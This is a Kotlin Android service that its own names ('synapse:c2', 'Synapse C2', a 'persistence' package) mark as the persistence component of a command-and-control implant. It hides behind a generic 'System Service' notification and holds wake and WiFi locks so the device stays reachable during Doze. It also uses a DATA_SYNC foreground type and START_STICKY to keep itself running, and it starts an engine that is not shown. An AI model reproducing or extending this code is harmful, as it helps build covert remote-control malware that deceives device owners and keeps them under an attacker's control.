package org.synapse.core.persistence

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import org.synapse.core.MainActivity
import org.synapse.core.core.SynapseEngine

class SynapseService : Service() {

    companion object {
        private const val TAG = "Synapse"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "synapse_service"
        private const val WAKELOCK_TAG = "synapse:c2"
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        // ── Android 14+: Use DATA_SYNC type to exempt from Doze restrictions ──
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // ── Acquire locks to prevent sleep and WiFi disconnection ──
        acquireLocks()

        // ── Request battery optimization exemption ──
        requestBatteryExemption()

        // ── Launch engine if not already running ──
        SynapseEngine.start(this)

        Log.d(TAG, "Foreground service started — launching engine")
        return START_STICKY
    }

    override fun onDestroy() {
        releaseLocks()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ═══════════════════════════════════════════════════════════════
    // Locks: prevent CPU sleep and WiFi disconnection during Doze
    // ═══════════════════════════════════════════════════════════════

    private fun acquireLocks() {
        try {
            // Partial wake lock — keeps CPU running while screen is off
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$WAKELOCK_TAG:wakelock"
            ).apply {
                setReferenceCounted(false)
                acquire(10 * 60 * 1000L) // 10-minute timeout, renewable
            }
            Log.d(TAG, "WakeLock acquired")
        } catch (e: Exception) {
            Log.w(TAG, "WakeLock failed: ${e.message}")
        }

        try {
            // WiFi lock — keeps WiFi radio active during Doze
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wifiLock = wm.createWifiLock(
                WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                "$WAKELOCK_TAG:wifilock"
            ).apply {
                setReferenceCounted(false)
                acquire()
            }
            Log.d(TAG, "WifiLock acquired")
        } catch (e: Exception) {
            Log.w(TAG, "WifiLock failed: ${e.message}")
        }
    }

    private fun releaseLocks() {
        try { wakeLock?.release() } catch (_: Exception) {}
        try { wifiLock?.release() } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════════════════════════
    // Battery optimization exemption request
    // ═══════════════════════════════════════════════════════════════

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                // On Samsung, the Knox binder may bypass this dialog.
                // Fallback: try to open settings (user must grant manually)
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    // Don't auto-launch the intent — it requires user interaction.
                    // The WakeLock + WifiLock + DATA_SYNC type is sufficient for persistence.
                    Log.d(TAG, "Battery optimization exemption: user action required")
                } catch (e: Exception) {
                    Log.w(TAG, "Battery exemption request failed: ${e.message}")
                }
            } else {
                Log.d(TAG, "Already exempted from battery optimization")
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Synapse C2"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
}
